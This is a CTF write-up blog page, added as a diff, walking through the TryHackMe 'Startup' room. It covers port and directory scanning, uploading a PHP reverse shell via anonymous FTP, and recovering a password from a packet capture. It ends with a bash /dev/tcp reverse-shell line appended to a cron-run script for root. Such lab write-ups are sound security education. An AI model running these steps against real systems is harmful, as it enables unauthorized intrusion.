@@ -1,0 +1,191 @@
+<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Writeup - THM - Startup -Phil Malle </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Walkthrough of Startup of TryHackMe.- Writeup - THM - Startup"> <meta name="keywords" content="Writeup - THM - Startup, Phil Malle, walkthroughs,tryhackeme, Startup, Wireshark, spicy, cron, enumeration, gobuster"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="Phil Malle" property="og:site_name" /> <meta content="Writeup - THM - Startup" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Walkthrough of Startup of TryHackMe." property="og:description" /> <meta content="/blog/startup/" property="og:url" /> <meta content="2020-11-09T23:14:00+00:00" property="article:published_time" /> <meta content="/about/" property="article:author" /> <meta content="/assets/img/thm-images/THM-Startup.png" property="og:image" /> <meta content="walkthroughs" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Writeup - THM - Startup" /> <meta name="twitter:url" content="/blog/startup/" /> <meta name="twitter:description" content="Walkthrough of Startup of TryHackMe." /> <link rel="stylesheet" href="/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = '' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="/assets/js/search.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!-- (you can remove the below scripts but do buy me a coffee to show some support :) --> <!-- buy me a coffeee --> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="philmalle" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">Phil Malle</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="/about" >About Me</a > </li> <li class="nav-item"> <a class="nav-link" href="/gallery" >Achievements</a > </li> <li class="nav-item"> <a class="nav-link" href="/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="/contact" >Contact</a > </li> <li class="nav-item"> <a class="nav-link" href="/links" >Links</a > </li> <li class="nav-item"> <a class="nav-link" href="/pgp" >GNUPG-Public Key</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li> </ul> </nav> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Writeup - THM - Startup</h1> <h4 class="post-meta">Walkthrough of Startup of TryHackMe.</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="/blog/authors/fr3akazo1d">fr3akazo1d</a></span> </span > at <time datetime="2020-11-09 23:14:00 +0000" itemprop="datePublished" >Nov 9, 2020</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/startup/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/walkthroughs" >walkthroughs</a > </div> </div> <div class="card-body" itemprop="articleBody"> <center> <img src="/assets/img/thm-images/THM-Startup.png" alt="" /></center> <br /> <br /> <h1 id="general-information">General Information</h1> <table> <thead> <tr> <th>Room</th> <th>Date</th> <th>Difficulty</th> <th>Tags</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>Startup</td> <td>09.11.2020</td> <td>easy</td> <td>Wireshark, gobuster, cron, enumeration</td> <td>2h 40min</td> </tr> </tbody> </table> <h1 id="tasks">tasks</h1> <table> <thead> <tr> <th>ID</th> <th>Status</th> <th>UUID</th> <th>Age</th> <th>Done</th> <th>Project</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td>1</td> <td>Completed</td> <td>cde461e7</td> <td>2h</td> <td>1h</td> <td>THM-Startup</td> <td>Starting up Target.</td> </tr> <tr> <td>2</td> <td>Completed</td> <td>e8728a9e</td> <td>2h</td> <td>2h</td> <td>THM-Startup</td> <td>What is the secret spicy soup recipe?</td> </tr> <tr> <td>3</td> <td>Completed</td> <td>59aaab62</td> <td>2h</td> <td>2h</td> <td>THM-Startup</td> <td>What are the contents of user.txt</td> </tr> <tr> <td>4</td> <td>Completed</td> <td>66e829ab</td> <td>2h</td> <td>2h</td> <td>THM-Startup</td> <td>What are the contents of root.txt</td> </tr> </tbody> </table> <h1 id="duration">Duration</h1> <table> <thead> <tr> <th>Recorded “THM-Startup”</th> </tr> </thead> <tbody> <tr> <td>Started 2020-11-09 T19:27:04</td> </tr> <tr> <td>Ended 22:06:21</td> </tr> <tr> <td>Total 2:39:17</td> </tr> </tbody> </table> <h1 id="used-programs">Used Programs</h1> <table> <thead> <tr> <th>Program</th> <th>Command</th> </tr> </thead> <tbody> <tr> <td>namp</td> <td>nmap -sC -sV -oN nmap/initial $ip</td> </tr> <tr> <td>ftp</td> <td>ftp $ip</td> </tr> <tr> <td>gobuster</td> <td>gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</td> </tr> <tr> <td>nc</td> <td>nc -lnvp 9901</td> </tr> </tbody> </table> <h1 id="open-ports">open ports</h1> <table> <thead> <tr> <th>Port</th> <th>Service</th> <th>Version</th> </tr> </thead> <tbody> <tr> <td>21</td> <td>ftp-server</td> <td>vsftpd 3.0.3</td> </tr> <tr> <td>22</td> <td>ssh</td> <td>OpenSSH 7.2p2</td> </tr> <tr> <td>80</td> <td>Http-Server</td> <td>Apache httpd 2.4.18</td> </tr> </tbody> </table> <h1 id="summary-spoiler">Summary (Spoiler)</h1> <p>As always i have started with a nmap scan of the Target. The nmap scan shows me that there are three-ports open on the Target. The next step as i saw was a gobuster scan on the the Web-Server. Beside the gobuster scan i login in to the FTP-Server and check if there is something interessting on this ftp-share. I also saw a text file in the nmap scan output. The next step was to get access to Web-Server. This could be done with a reverse-shell uploaded to the FTP-Server.</p> <p>After that we cann run the php file and we get access to the server.</p> <p>On the Target we have to figure out how we can get to the user account. Because we are logged in as “www-data” and we have no rights to do anything on this target.</p> <p>On the target there is a Wireshark file located witch contains a password for the user. When we got the password we can loggin in and countiue for the root access.</p> <p>The root acces has something to do with cronjobs. I have addedd a bash reverse shell to the a specific file and then waited for the connection back to my machine. When the connection is done we have root rights on the target.</p> <h1 id="start-enumeration">Start Enumeration</h1> <h2 id="nmap-scan-output">Nmap Scan-Output</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/initial <span class="nv">$ip</span> <span class="nt">-Pn</span>
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-09 19:33 CET
+Nmap scan report <span class="k">for </span>10.10.180.221
+Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp <span class="o">[</span>NSE: writeable]
+|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.9.170.39
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf <span class="o">(</span>RSA<span class="o">)</span>
+|   256 <span class="nb">dd</span>:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Maintenance
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.14 seconds
+</code></pre></div></div> <h2 id="noticetxt-output">notice.txt output</h2> <p>output of text file form ftp-share:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat notice.txt
+───────┬──────────────────────────────────────────────────────────────────
+       │ File: notice.txt
+───────┼──────────────────────────────────────────────────────────────────
+   1   │ Whoever is leaving these damn Among Us memes <span class="k">in </span>this share, it IS
+       │  NOT FUNNY. People downloading documents from our website will th
+       │ ink we are a joke! Now I dont know <span class="nb">who </span>it is, but Maya is looking
+       │  pretty sus.
+───────┴──────────────────────────────────────────────────────────────────  
+</code></pre></div></div> <h2 id="testlog-output">test.log output</h2> <p>Found another file on the share (hidden file).</p> <p>output of the test.log file form FTP-share:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ bat test.log
+───────┬──────────────────────────────────────────────────────────────────
+       │ File: test.log
+───────┼──────────────────────────────────────────────────────────────────
+   1   │ <span class="nb">test</span>
+───────┴──────────────────────────────────────────────────────────────────
+</code></pre></div></div> <h2 id="gobuster-output">gobuster output</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://startup.thm <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://startup.thm
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/11/10 08:19:18 Starting gobuster
+<span class="o">===============================================================</span>
+/files <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/11/10 08:45:13 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div> <p>Gobuster shows me that there is a file-folder on the Web-Server. After checking the folder i know that this is the FTP-Folder.</p> <h1 id="weaponization">Weaponization</h1> <p>After Enumeration the Web-Site, the FTP-Share i have figured out, how i can get access to the Web-Server.</p> <p>In the enuermation i found out, that the FTP-folder on the FTP-Share is writeaple:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp <span class="o">[</span>NSE: writeable]
+</code></pre></div></div> <p>We can upload a reverse shell to the share and execute it from the Browser. This is possible due that fact that the ftp-folder is also accessible from the Web-Browser.</p> <p>I used the php-reverse-shell scirpt witch is located in kali:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate php-reverse-shell.php
+/usr/share/webshells/php/php-reverse-shell.php<span class="se">\</span>
+</code></pre></div></div> <p>In the script i changed the IP-Address and the port whitch i use for the reverse-shell to call back to me.</p> <h1 id="delivery">Delivery</h1> <p>The next step is deliver the reverse-shell to the ftp-folder. Due that fact that anonymous login is available we can upload the shell via command line to the ftp-folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp startup.thm
+Connected to startup.thm.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>startup.thm:fr3akazo1d<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">cd </span>ftp
+250 Directory successfully changed.
+ftp&gt; put shell.php
+<span class="nb">local</span>: shell.php remote: shell.php
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5493 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>1.7520 MB/s<span class="o">)</span>
+ftp&gt;
+</code></pre></div></div> <p>Now we have a php-reverse-shell script on the FTP-Server:</p> <p><img src="/assets/img/thm-images/THM-Startup-3.png" alt="Shell uploaded to FTP-Share" /></p> <h1 id="exploitation">Exploitation</h1> <p>The Exploitation is a simple step on this target. We only have to run the shell.php script in the Web-Browser by simple clicking on the file.</p> <p>I have started a netcat listener on my machine so i get back the reverse shell:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 9901
+listening on <span class="o">[</span>any] 9901 ...
+connect to <span class="o">[</span>10.9.170.39] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.76.61] 50996
+Linux startup 4.4.0-190-generic <span class="c">#220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 07:44:37 up 28 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ date
+Tue Nov 10 07:44:59 UTC 2020
+$ 
+</span></code></pre></div></div> <p>Now We can have a look into the Files.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@startup:/<span class="nv">$ </span><span class="nb">ls
+ls
+</span>bin   etc   initrd.img.old  media  recipe.txt  snap  usr      vmlinuz.old
+boot  home    lib     mnt  root      srv   vagrant
+data  incidents   lib64     opt  run       sys   var
+dev   initrd.img  lost+found    proc   sbin      tmp   vmlinuz
+www-data@startup:/<span class="nv">$ </span>
+</code></pre></div></div> <p>There is a file called “recipe.txt”. when we cat this file we see the answer for the first Task of THM:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@startup:/<span class="nv">$ </span><span class="nb">cat </span>recipe.txt
+<span class="nb">cat </span>recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can<span class="s1">'t keep it a secret forever and told him it was l***.
+</span></code></pre></div></div> <p>Now we can got for the User.txt file, whitch is located under the user lennie, because this is the only user on the target. We have to escalate our privilage to this user.</p> <p>At this moment i was stuck a quite long. Then i found an interesting file “suspicious.pcapng” in the incidents folder. This is a Wireshark capture and we can check if we find some interessting capture in there.</p> <p>So i downloaded the file and opened it with wireshark.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@startup:/<span class="nv">$ </span><span class="nb">cd </span>home
+<span class="nb">cd </span>home
+www-data@startup:/home<span class="nv">$ </span><span class="nb">cd </span>l<span class="k">****</span>e
+<span class="nb">cd </span>l<span class="k">****</span>e
+bash: <span class="nb">cd</span>: l<span class="k">****</span>e: Permission denied
+www-data@startup:/home<span class="nv">$ </span><span class="nb">ls
+ls
+</span>l<span class="k">****</span>e
+www-data@startup:/home<span class="nv">$ </span><span class="nb">cd </span>l<span class="k">****</span>e
+<span class="nb">cd </span>l<span class="k">****</span>e
+bash: <span class="nb">cd</span>: l<span class="k">****</span>e: Permission denied
+www-data@startup:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data: c<span class="k">****************</span>3
+
+Sorry, try again.
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data: 
+
+Sorry, try again.
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data: c<span class="k">****************</span>3
+
+<span class="nb">sudo</span>: 3 incorrect password attempts
+www-data@startup:/home<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+<span class="nb">cat</span> /etc/passwd
+</code></pre></div></div> <p>After checking the file i decided to follow the TCP-Stream of the Wireshark file. I found some interessting information in this Stream, it looks like there was in cyper incident befor and the attacker tried to sudo -l with a password.</p> <p>At this moment my mind was thinking, could this the password for user “l<em>**</em>e”, i gave it a try and yes. this was the password!</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@startup:/incidents<span class="nv">$ </span>su l<span class="k">****</span>e
+su l<span class="k">****</span>e
+Password: c<span class="k">****************</span>3
+
+l<span class="k">****</span>e@startup:/incidents<span class="nv">$ </span>
+</code></pre></div></div> <p>I tried it with ssh if i can get a better bash on the target.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls
+</span>Documents  scripts  user.txt
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>l<span class="k">****</span>e<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>l<span class="k">****</span>e<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>l<span class="k">****</span>e<span class="o">)</span>
+<span class="nv">$ </span>bash
+l<span class="k">****</span>e@startup:~<span class="nv">$ </span><span class="nb">ls
+</span>Documents  scripts  user.txt
+l<span class="k">****</span>e@startup:~<span class="err">$</span>
+</code></pre></div></div> <p>It Worked, now i have access via ssh and i can go for root permissions.</p> <p>But first lets cat the user.txt file and finished task 2 from THM!</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>THM<span class="o">{</span>0<span class="k">******************************</span>9<span class="o">}</span>
+</code></pre></div></div> <h1 id="root-enumeration">Root-Enumeration</h1> <p>Now we have access via ssh we can look int some userfiles. Or other missconfiguration of the target to get to the root rights.</p> <p>In the user directory there are tow folders:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l<span class="k">****</span>e@startup:~<span class="nv">$ </span><span class="nb">ls
+</span>Documents  scripts  user.txt
+l<span class="k">****</span>e@startup:~<span class="err">$</span>
+</code></pre></div></div> <p>The first folder i was checking was the “scripts” folder. There is bash script called “planner.sh”. This script is calling another scirpt called “print.sh”</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l<span class="k">****</span>e@startup:~/scripts<span class="nv">$ </span><span class="nb">cat </span>planner.sh
+<span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="nv">$LIST</span> <span class="o">&gt;</span> /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+</code></pre></div></div> <p>Lets find this file and check what is in the file:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l<span class="k">****</span>e@startup:~/scripts<span class="nv">$ </span>find / <span class="nt">-name</span> print.sh 2&gt;/dev/null
+/etc/print.sh
+</code></pre></div></div> <p>The file is located in the “/etc” folder and it is owned by l<em>**</em>e and he has write access to the file:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l<span class="k">****</span>e@startup:~/scripts<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/print.sh
+<span class="nt">-rwx------</span> 1 l<span class="k">****</span>e l<span class="k">****</span>e 25 Nov  9 02:12 /etc/print.sh
+</code></pre></div></div> <h1 id="exploitation-to-root">Exploitation to root</h1> <p>I was checking the cronjobs on the target, but i found nothing witch is calling the planner.sh scirpt in the user folder. But the “planner.sh” was owned by root. So i was thinking that there is a job running witch is calling the script.</p> <p>I have write access to the “print.sh” file. Maybe i can add a bash reverse-shell to the “print.sh” file and it will gave me a reverse-shell.</p> <h1 id="weaponization-to-root">Weaponization to root</h1> <p>I got the revese-shell from pentestmonky</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.9.170.39/8080 0&gt;&amp;1
+</code></pre></div></div> <p>I changed it to my ip address and added this to the “print.sh” file and started a listener on my machine:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.9.170.39/8080 0&gt;&amp;1"</span> <span class="o">&gt;&gt;</span> /etc/print.sh
+</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l<span class="k">****</span>e@startup:~/scripts<span class="nv">$ </span><span class="nb">cat</span> /etc/print.sh
+<span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"Done!"</span>
+l<span class="k">****</span>e@startup:~/scripts<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.9.170.39/8080 0&gt;&amp;1"</span> <span class="o">&gt;&gt;</span> /etc/print.sh
+l<span class="k">****</span>e@startup:~/scripts<span class="nv">$ </span><span class="nb">cat</span> /etc/print.sh
+<span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"Done!"</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.9.170.39/8080 0&gt;&amp;1
+</code></pre></div></div> <p>Now i have to wait if there is a revershell comming back to me.</p> <p>After some minutes i got a reverse shell and i am logged in as root.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 8080
+listening on <span class="o">[</span>any] 8080 ...
+connect to <span class="o">[</span>10.9.170.39] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.76.61] 41020
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1916<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@startup:~# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@startup:~# <span class="nb">whoami
+whoami
+</span>root
+root@startup:~# 
+</code></pre></div></div> <p>So i rooted the target and i can read the root.txt file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@startup:~# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+THM<span class="o">{</span>f<span class="k">******************************</span>d<span class="o">}</span>
+</code></pre></div></div> <p>We now have closed all three task from THM and we shown the Startup-Company that the have to work on the security of there website.</p> <h1 id="conclusion">Conclusion</h1> <p>This Room had not much new things on it but the user escalation was very interessting. But for the access to the target i was stuck i quite long. The enumeration with the wireshark capture was very interessting, this is something i haven’t seen on any room of THM.</p> <p>As i saw the tag with cron, and i don’t really saw the cronjob running for the root escalation. I have to work on the cronjobs.</p> <p>But for some last words. It was interessting and i takes me 2h and 40min to get to root access.</p> <p>th4nks f0r r3ad1ng</p> <p>Fr3akazo1d</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="/blog/startup/" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About Fr3akazo1d! </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="/assets/img/authors/freakazoid.png" alt="Fr3akazo1d!" /> </div> <div class="col-md-6"> <p class="author_bio">Cyber-Security Entusiast, CTF-Player</p> <p>Email : fr3akazo1d@protonmail.com</p> <p>Website : https://fr3akazo1d.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/fr3akazo1d" target="_blank"><i class="fab fa-github fa-fw"></i></a> </p> </div> </div> </div> </div> </div> <!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <script> var disqus_config = function () { this.page.url = "/blog/startup/"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/THM-Startup-Writeup"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 